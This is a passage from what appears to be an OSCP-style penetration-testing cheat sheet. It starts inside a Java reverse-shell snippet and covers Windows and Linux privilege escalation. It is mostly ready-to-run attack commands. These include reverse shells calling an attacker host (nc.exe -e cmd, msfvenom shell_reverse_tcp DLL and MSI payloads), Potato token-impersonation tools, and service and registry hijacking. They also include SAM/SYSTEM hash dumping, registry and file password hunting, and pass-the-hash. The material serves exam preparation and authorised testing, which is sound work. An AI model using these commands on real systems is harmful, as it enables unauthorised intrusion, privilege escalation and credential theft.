</span></span><span class="line"><span class="cl"><span class="k">Process</span> <span class="n">p</span><span class="p">=</span><span class="n">new</span> <span class="n">ProcessBuilder</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="py">redirectErrorStream</span><span class="p">(</span><span class="n">true</span><span class="p">).</span><span class="py">start</span><span class="p">();</span><span class="n">Socket</span> <span class="n">s</span><span class="p">=</span><span class="n">new</span> <span class="n">Socket</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">);</span><span class="n">InputStream</span> <span class="n">pi</span><span class="p">=</span><span class="n">p</span><span class="p">.</span><span class="py">getInputStream</span><span class="p">(),</span><span class="n">pe</span><span class="p">=</span><span class="n">p</span><span class="p">.</span><span class="py">getErrorStream</span><span class="p">(),</span> <span class="n">si</span><span class="p">=</span><span class="n">s</span><span class="p">.</span><span class="py">getInputStream</span><span class="p">();</span><span class="n">OutputStream</span> <span class="n">po</span><span class="p">=</span><span class="n">p</span><span class="p">.</span><span class="py">getOutputStream</span><span class="p">(),</span><span class="n">so</span><span class="p">=</span><span class="n">s</span><span class="p">.</span><span class="py">getOutputStream</span><span class="p">();</span><span class="k">while</span><span class="p">(!</span><span class="n">s</span><span class="p">.</span><span class="py">isClosed</span><span class="p">()){</span><span class="k">while</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="py">available</span><span class="p">()&gt;</span><span class="mf">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="py">write</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="py">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="py">available</span><span class="p">()&gt;</span><span class="mf">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="py">write</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="py">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="py">available</span><span class="p">()&gt;</span><span class="mf">0</span><span class="p">)</span><span class="n">po</span><span class="p">.</span><span class="py">write</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="py">read</span><span class="p">());</span><span class="n">so</span><span class="p">.</span><span class="py">flush</span><span class="p">();</span><span class="n">po</span><span class="p">.</span><span class="py">flush</span><span class="p">();</span><span class="n">Thread</span><span class="p">.</span><span class="py">sleep</span><span class="p">(</span><span class="mf">50</span><span class="p">);</span><span class="k">try</span> <span class="p">{</span><span class="n">p</span><span class="p">.</span><span class="py">exitValue</span><span class="p">();</span><span class="k">break</span><span class="p">;}</span><span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">){}};</span><span class="n">p</span><span class="p">.</span><span class="py">destroy</span><span class="p">();</span><span class="n">s</span><span class="p">.</span><span class="py">close</span><span class="p">();</span>
</span></span></code></pre></div><hr>
<h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1>
<aside>
💡 `cd C:\ & findstr /SI /M "OS{" *.xml *.ini *.txt` - for finding files which contain OSCP flag..
</aside>
<h2 id="manual-enumeration-commands">Manual Enumeration commands</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Groups we&#39;re part of</span>
</span></span><span class="line"><span class="cl">whoami /groups
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">whoami /all <span class="c1">#lists everything we own.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Starting, Restarting and Stopping services in Powershell</span>
</span></span><span class="line"><span class="cl">Start-Service &lt;service&gt;
</span></span><span class="line"><span class="cl">Stop-Service &lt;service&gt;
</span></span><span class="line"><span class="cl">Restart-Service &lt;service&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Powershell History</span>
</span></span><span class="line"><span class="cl">Get-History
</span></span><span class="line"><span class="cl"><span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath <span class="c1">#displays the path of consoleHost_history.txt</span>
</span></span><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\s</span>athvik<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Viewing installed execuatbles</span>
</span></span><span class="line"><span class="cl">Get-ItemProperty <span class="s2">&#34;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="p">|</span> <span class="k">select</span> displayname
</span></span><span class="line"><span class="cl">Get-ItemProperty <span class="s2">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="p">|</span> <span class="k">select</span> displayname
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Process Information</span>
</span></span><span class="line"><span class="cl">Get-Process
</span></span><span class="line"><span class="cl">Get-Process <span class="p">|</span> Select ProcessName,Path
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Sensitive info in XAMPP Directory</span>
</span></span><span class="line"><span class="cl">Get-ChildItem -Path C:<span class="se">\x</span>ampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
</span></span><span class="line"><span class="cl">Get-ChildItem -Path C:<span class="se">\U</span>sers<span class="se">\d</span>ave<span class="se">\ </span>-Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue <span class="c1">#this for a specific user</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Service Information</span>
</span></span><span class="line"><span class="cl">Get-CimInstance -ClassName win32_service <span class="p">|</span> Select Name,State,PathName <span class="p">|</span> Where-Object <span class="o">{</span><span class="nv">$_</span>.State -like <span class="s1">&#39;Running&#39;</span><span class="o">}</span>
</span></span></code></pre></div><h2 id="automated-scripts">Automated Scripts</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">winpeas.exe
</span></span><span class="line"><span class="cl">winpeas.bat
</span></span><span class="line"><span class="cl">Jaws-enum.ps1
</span></span><span class="line"><span class="cl">powerup.ps1
</span></span><span class="line"><span class="cl">PrivescCheck.ps1
</span></span></code></pre></div><h2 id="token-impersonation">Token Impersonation</h2>
<ul>
<li>Command to check <code>whoami /priv</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Printspoofer</span>
</span></span><span class="line"><span class="cl"><span class="n">PrintSpoofer</span><span class="p">.</span><span class="py">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> 
</span></span><span class="line"><span class="cl"><span class="n">PrintSpoofer</span><span class="p">.</span><span class="py">exe</span> <span class="n">-c</span> <span class="s2">&#34;nc.exe &lt;lhost&gt; &lt;lport&gt; -e cmd&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#RoguePotato</span>
</span></span><span class="line"><span class="cl"><span class="n">RoguePotato</span><span class="p">.</span><span class="py">exe</span> <span class="n">-r</span> <span class="p">&lt;</span><span class="n">AttackerIP</span><span class="p">&gt;</span> <span class="n">-e</span> <span class="s2">&#34;shell.exe&#34;</span> <span class="n">-l</span> <span class="mf">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#GodPotato</span>
</span></span><span class="line"><span class="cl"><span class="n">GodPotato</span><span class="p">.</span><span class="py">exe</span> <span class="n">-cmd</span> <span class="s2">&#34;cmd /c whoami&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">GodPotato</span><span class="p">.</span><span class="py">exe</span> <span class="n">-cmd</span> <span class="s2">&#34;shell.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#JuicyPotatoNG</span>
</span></span><span class="line"><span class="cl"><span class="n">JuicyPotatoNG</span><span class="p">.</span><span class="py">exe</span> <span class="n">-t</span> <span class="p">*</span> <span class="n">-p</span> <span class="s2">&#34;shell.exe&#34;</span> <span class="n">-a</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#SharpEfsPotato</span>
</span></span><span class="line"><span class="cl"><span class="n">SharpEfsPotato</span><span class="p">.</span><span class="py">exe</span> <span class="n">-p</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="mf">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-a</span> <span class="s2">&#34;whoami | Set-Content C:\temp\w.log&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c">#writes whoami command to w.log file</span>
</span></span></code></pre></div><h2 id="services">Services</h2>
<h3 id="binary-hijacking">Binary Hijacking</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Identify service from winpeas</span>
</span></span><span class="line"><span class="cl"><span class="n">icalcs</span> <span class="s2">&#34;path&#34;</span> <span class="c">#F means full permission, we need to check we have full access on the folder</span>
</span></span><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">qc</span> <span class="p">&lt;</span><span class="n">servicename</span><span class="p">&gt;</span> <span class="c">#find binary path variable</span>
</span></span><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">config</span> <span class="p">&lt;</span><span class="n">service</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">option</span><span class="p">&gt;=</span><span class="s2">&#34;&lt;value&gt;&#34;</span> <span class="c">#change the path to the reverse shell location</span>
</span></span><span class="line"><span class="cl"><span class="nb">sc start </span><span class="p">&lt;</span><span class="n">servicename</span><span class="p">&gt;</span>
</span></span></code></pre></div><h3 id="unquoted-service-path">Unquoted Service Path</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wmic service get name,pathname <span class="p">|</span> findstr /i /v <span class="s2">&#34;C:\Windows\\&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;&#34;&#34;  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
</span></span></span><span class="line"><span class="cl"><span class="s2">#Check the Writable path
</span></span></span><span class="line"><span class="cl"><span class="s2">icalcs &#34;</span>path<span class="s2">&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">#Insert the payload in writable location and which works.
</span></span></span><span class="line"><span class="cl"><span class="s2">sc start &lt;servicename&gt;
</span></span></span></code></pre></div><h3 id="insecure-service-executables">Insecure Service Executables</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#In Winpeas look for a service which has the following</span>
</span></span><span class="line"><span class="cl">File Permissions: Everyone <span class="o">[</span>AllAccess<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Replace the executable in the service folder and start the service</span>
</span></span><span class="line"><span class="cl">sc start &lt;service&gt;
</span></span></code></pre></div><h3 id="weak-registry-permissions">Weak Registry permissions</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Look for the following in Winpeas services info output</span>
</span></span><span class="line"><span class="cl">HKLM<span class="se">\s</span>ystem<span class="se">\c</span>urrentcontrolset<span class="se">\s</span>ervices<span class="se">\&lt;</span>service&gt; <span class="o">(</span>Interactive <span class="o">[</span>FullControl<span class="o">])</span> <span class="c1">#This means we have full access</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">accesschk /acceptula -uvwqk &lt;path of registry&gt; <span class="c1">#Check for KEY_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Service Information from regedit, identify the variable that holds the executable</span>
</span></span><span class="line"><span class="cl">reg query &lt;reg-path&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">reg add HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\s</span>ervices<span class="se">\r</span>egsvc /v ImagePath /t REG_EXPAND_SZ /d C:<span class="se">\P</span>rivEsc<span class="se">\r</span>everse.exe /f
</span></span><span class="line"><span class="cl"><span class="c1">#Imagepath is the variable here</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">net start &lt;service&gt;
</span></span></code></pre></div><h2 id="dll-hijacking">DLL Hijacking</h2>
<ol>
<li>Find Missing DLLs using Process Monitor, Identify a specific service that looks suspicious, and add a filter.</li>
<li>Check whether you have write permissions in the directory associated with the service.</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a reverse-shell</span>
</span></span><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;attaker-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listening-port&gt; -f dll &gt; filename.dll
</span></span></code></pre></div><ol start="3">
<li>Copy it to the victim machine and then move it to the service-associated directory.(Make sure the dll name is similar to the missing name)</li>
<li>Start the listener and restart the service; you&rsquo;ll get a shell.</li>
</ol>
<h2 id="autorun">Autorun</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#For checking, it will display some information with file-location</span>
</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Run</span>
</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Run</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Check the location is writable</span>
</span></span><span class="line"><span class="cl"><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">\</span><span class="n">accepteula</span> <span class="n">-wvu</span> <span class="s2">&#34;&lt;path&gt;&#34;</span> <span class="c">#returns FILE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Replace the executable with the reverseshell and we need to wait till Admin logins, then we&#39;ll have shell</span>
</span></span></code></pre></div><h2 id="alwaysinstallelevated">AlwaysInstallElevated</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#For checking, it should return 1 or Ox1</span>
</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Creating a reverseshell in msi format</span>
</span></span><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=&lt;</span><span class="n">port</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="o">-f</span> <span class="n">msi</span> <span class="p">&gt;</span> <span class="n">reverse</span><span class="p">.</span><span class="py">msi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Execute and get shell</span>
</span></span><span class="line"><span class="cl"><span class="n">msiexec</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">qn</span> <span class="p">/</span><span class="n">i</span> <span class="n">reverse</span><span class="p">.</span><span class="py">msi</span>
</span></span></code></pre></div><h2 id="schedules-tasks">Schedules Tasks</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">schtasks /query /fo LIST /v <span class="c1">#Displays list of scheduled tasks, Pickup any interesting one</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Permission check - Writable means exploitable!</span>
</span></span><span class="line"><span class="cl">icalcs <span class="s2">&#34;path&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Wait till the scheduled task in executed, then we&#39;ll get a shell</span>
</span></span></code></pre></div><h2 id="startup-apps">Startup Apps</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartUp <span class="c1">#Startup applications can be found here</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Check writable permissions and transfer</span>
</span></span><span class="line"><span class="cl"><span class="c1">#The only catch here is the system needs to be restarted</span>
</span></span></code></pre></div><h2 id="insecure-gui-apps">Insecure GUI apps</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Check the applications that are running from &#34;TaskManager&#34; and obtain list of applications that are running as Privileged user</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Open that particular application, using &#34;open&#34; feature enter the following</span>
</span></span><span class="line"><span class="cl">file://c:/windows/system32/cmd.exe 
</span></span></code></pre></div><h2 id="sam-and-system">SAM and SYSTEM</h2>
<ul>
<li>Check in the following folders</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Usually %SYSTEMROOT% = C:\Windows</span>
</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\r</span>epair<span class="se">\S</span>AM
</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\R</span>egBack<span class="se">\S</span>AM
</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>AM
</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\r</span>epair<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM
</span></span><span class="line"><span class="cl">%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\R</span>egBack<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\w</span>indows.old
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#First go to c:</span>
</span></span><span class="line"><span class="cl">dir /s SAM
</span></span><span class="line"><span class="cl">dir /s SYSTEM
</span></span></code></pre></div><ul>
<li>Obtaining Hashes from SYSTEM and SAM</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -system SYSTEM -sam SAM <span class="nb">local</span> <span class="c1">#always mention local in the command</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Now a detailed list of hashes are displayed</span>
</span></span></code></pre></div><h2 id="passwords">Passwords</h2>
<h3 id="sensitive-files">Sensitive files</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">findstr /si password *.txt  
</span></span><span class="line"><span class="cl">findstr /si password *.xml  
</span></span><span class="line"><span class="cl">findstr /si password *.ini  
</span></span><span class="line"><span class="cl">Findstr /si password *.config 
</span></span><span class="line"><span class="cl">findstr /si pass/pwd *.ini  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dir /s *pass* <span class="o">==</span> *cred* <span class="o">==</span> *vnc* <span class="o">==</span> *.config*  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">in all files  
</span></span><span class="line"><span class="cl">findstr /spin <span class="s2">&#34;password&#34;</span> *.*  
</span></span><span class="line"><span class="cl">findstr /spin <span class="s2">&#34;password&#34;</span> *.*
</span></span></code></pre></div><h3 id="config-files">Config files</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c:<span class="se">\s</span>ysprep.inf  
</span></span><span class="line"><span class="cl">c:<span class="se">\s</span>ysprep<span class="se">\s</span>ysprep.xml  
</span></span><span class="line"><span class="cl">c:<span class="se">\u</span>nattend.xml  
</span></span><span class="line"><span class="cl">%WINDIR%<span class="se">\P</span>anther<span class="se">\U</span>nattend<span class="se">\U</span>nattended.xml  
</span></span><span class="line"><span class="cl">%WINDIR%<span class="se">\P</span>anther<span class="se">\U</span>nattended.xml  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dir /b /s unattend.xml  
</span></span><span class="line"><span class="cl">dir /b /s web.config  
</span></span><span class="line"><span class="cl">dir /b /s sysprep.inf  
</span></span><span class="line"><span class="cl">dir /b /s sysprep.xml  
</span></span><span class="line"><span class="cl">dir /b /s *pass*  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dir c:<span class="se">\*</span>vnc.ini /s /b  
</span></span><span class="line"><span class="cl">dir c:<span class="se">\*</span>ultravnc.ini /s /b   
</span></span><span class="line"><span class="cl">dir c:<span class="se">\ </span>/s /b <span class="p">|</span> findstr /si *vnc.ini
</span></span></code></pre></div><h3 id="registry">Registry</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reg query HKLM /f password /t REG_SZ /s
</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Putty keys</span>
</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span>
</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span> /s <span class="p">|</span> findstr <span class="s2">&#34;HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername&#34;</span> <span class="c1">#Check the values saved in each session, user/password could be there</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### VNC</span>
</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\ORL\WinVNC3\Password&#34;</span>  
</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\TightVNC\Server&#34;</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### Windows autologin  </span>
</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span>  
</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span> 2&gt;nul <span class="p">|</span> findstr <span class="s2">&#34;DefaultUserName DefaultDomainName DefaultPassword&#34;</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### SNMP Parameters  </span>
</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&#34;</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### Putty  </span>
</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### Search for the password in the registry  </span>
</span></span><span class="line"><span class="cl">reg query HKLM /f password /t REG_SZ /s  
</span></span><span class="line"><span class="cl">reg query HKCU /f password /t REG_SZ /s
</span></span></code></pre></div><h3 id="runas---savedcreds">RunAs - Savedcreds</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cmdkey /list <span class="c1">#Displays stored credentials looks for any optential users</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Transfer the reverseshell</span>
</span></span><span class="line"><span class="cl">runas /savecred /user:admin C:<span class="se">\T</span>emp<span class="se">\r</span>everse.exe
</span></span></code></pre></div><h3 id="pass-the-hash">Pass the Hash</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#If hashes are obtained through some means, then use psexec and smbexec and obtain the shell as a different user.</span>
</span></span><span class="line"><span class="cl">pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
</span></span></code></pre></div><hr>
<h1 id="linux-privilege-escalation">Linux Privilege Escalation</h1>
<ul>
<li><a href="https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa">Privesc through TAR wildcard</a></li>
</ul>
<h2 id="tty-shell">TTY Shell</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">python</span> <span class="n">-c</span> <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">-c</span> <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo </span><span class="s1">&#39;os.system(&#39;</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span><span class="s1">&#39;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">sh</span> <span class="n">-i</span>
</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span> <span class="n">-i</span>
</span></span><span class="line"><span class="cl"><span class="n">perl</span> <span class="n">-e</span> <span class="s1">&#39;exec &#34;/bin/sh&#34;;&#39;</span>
</span></span></code></pre></div><h2 id="basic">Basic</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -writable -type d 2&gt;/dev/null
</span></span><span class="line"><span class="cl">dpkg -l <span class="c1">#Installed applications on Debian system</span>
</span></span><span class="line"><span class="cl">cat /etc/fstab <span class="c1">#Listing mounted drives</span>
</span></span><span class="line"><span class="cl">lsblk <span class="c1">#Listing all available drives</span>
</span></span><span class="line"><span class="cl">lsmod <span class="c1">#Listing loaded drivers</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">watch -n <span class="m">1</span> <span class="s2">&#34;ps -aux | grep pass&#34;</span> <span class="c1">#Checking processes for credentials</span>
</span></span><span class="line"><span class="cl">sudo tcpdump -i lo -A <span class="p">|</span> grep <span class="s2">&#34;pass&#34;</span> <span class="c1">#Password sniffing using tcpdump</span>
</span></span></code></pre></div><h2 id="automated-scripts-1">Automated Scripts</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">linPEAS.sh
</span></span><span class="line"><span class="cl">LinEnum.sh
</span></span><span class="line"><span class="cl">linuxprivchecker.py
</span></span><span class="line"><span class="cl">unix-privesc-check
</span></span><span class="line"><span class="cl">Mestaploit: multi/recon/local_exploit_suggester
</span></span></code></pre></div><h2 id="sensitive-information">Sensitive Information</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat .bashrc
</span></span><span class="line"><span class="cl">env <span class="c1">#checking environment variables</span>
</span></span><span class="line"><span class="cl">watch -n <span class="m">1</span> <span class="s2">&#34;ps -aux | grep pass&#34;</span> <span class="c1">#Harvesting active processes for credentials</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Process-related information can also be obtained from PSPY</span>
</span></span></code></pre></div><h2 id="sudosuidcapabilities">Sudo/SUID/Capabilities</h2>
<p><a href="https://gtfobins.github.io/">GTFOBins</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -l
